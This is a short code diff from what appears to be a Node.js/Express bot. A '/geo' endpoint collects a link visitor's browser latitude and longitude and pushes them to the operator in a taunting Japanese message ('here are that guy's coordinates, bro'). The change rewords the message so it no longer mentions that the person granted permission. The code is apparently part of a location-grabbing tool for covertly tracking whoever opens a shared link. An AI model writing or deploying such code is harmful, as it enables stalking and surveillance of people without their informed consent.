@@ -108,7 +108,7 @@ app
     original = req.query.original;
     app.post("/geo", (Req, Res) => {
       Res.sendStatus(200);
-      pushMsg(`${nom}さんがなんと位置情報を許可しました...こちらが奴の緯度経度ですよ、兄貴\n\n緯度: ${Req.body.lat}\n経度: ${Req.body.lng}`, id);
+      pushMsg(`${nom}さんの位置情報が取得できました...こちらが奴の緯度と経度ですよ、兄貴\n\n緯度: ${Req.body.lat}\n経度: ${Req.body.lng}`, id);
       return;
     });
     res.sendFile(__dirname + '/open.html');
